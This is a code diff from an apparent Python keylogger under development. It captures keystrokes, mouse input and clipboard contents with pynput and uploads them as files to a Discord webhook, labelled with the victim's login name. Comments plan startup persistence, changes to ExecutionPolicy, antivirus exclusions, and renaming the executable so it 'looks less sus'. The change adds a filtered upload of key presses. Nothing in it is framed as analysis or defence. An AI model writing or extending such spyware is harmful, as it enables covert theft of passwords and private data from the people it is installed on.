@@ -10,15 +10,7 @@
 #       like removing main.exe from startup, restoring ExecutionPolicy settings, removing source folder from
 #       user directory, removing cache from exclusions list, and removing the cache folder
 
-#   Log mouse clicks and stuff
-
-#   store inputs in another file that is just each input side by side like plain text yknow
-
 #   rename and change icon of main.exe so it looks less sus if someone were to check startup processes
-
-#   store inputs in another file that is just each input side by side like plain text yknow
-#       but try and seperate text based on inputs (if someone clicks, presses enter or tab or stuff like that
-#       then they likely arent typing in the same textbox anymore)
 
 from pynput import keyboard, mouse
 from pathlib import Path
@@ -60,17 +52,18 @@ def check_if_should_send(lines):
         file_path = Path.home() / input_log_name
         file_path.parent.mkdir(parents=True, exist_ok=True)
         with file_path.open('r') as file:
-            webhook.add_file(file=file.read(), filename="keys.txt")
+            contents = file.read()
+            webhook.add_file(file=contents, filename="keys.txt")
+            lines = contents.splitlines()
+            filtered_lines = [line for line in lines if line.startswith(" Pressed:")]
+            filtered_content = "\n".join(filtered_lines)
+            webhook.add_file(file=filtered_content, filename="presses.txt")
+
         try:
             file_path = Path.home() / clipboard_log_name
             file_path.parent.mkdir(parents=True, exist_ok=True)
             with file_path.open('r') as file:
                 webhook.add_file(file=file.read(), filename="clipboard.txt")
-            
-            file_path = Path.home() / input_plaintext_name
-            file_path.parent.mkdir(parents=True, exist_ok=True)
-            with file_path.open('r') as file:
-                webhook.add_file(file=file.read(), filename="raw_text.txt")
         except:
             pass
         embed = DiscordEmbed(title=f"Logs from {os.getlogin()}", color=user_color)
